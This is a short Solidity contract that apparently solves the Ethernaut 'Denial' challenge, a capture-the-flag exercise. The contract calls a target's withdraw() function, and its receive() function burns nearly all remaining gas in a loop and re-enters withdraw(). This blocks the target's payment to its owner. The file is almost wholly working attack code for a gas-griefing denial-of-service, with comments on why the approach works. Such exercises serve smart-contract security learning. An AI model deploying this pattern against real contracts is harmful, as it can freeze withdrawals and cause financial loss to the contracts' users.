// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
}

contract AttackDenial {

  IDenial denialContract;

  constructor(address _denialContract) {
    denialContract = IDenial(_denialContract);
  }

  function testAssert() public {
    // Calling the withdraw() from the Denial contract sending the max amount of Gas specified by the challenge's description
    denialContract.withdraw{gas: 1000000}();
  }


  receive() external payable {
    //assert(false == true);    // When the transaction throws the assert in the Receiver contract, and the execution flows come back to the Caller, the gastleft() is still enough send the ETHs to the owner, looks like the EVM updates the fact that assert() depleted all the gas of the transaction! //
      
    while(gasleft() > 5000) {}
    denialContract.withdraw();
  }

    

}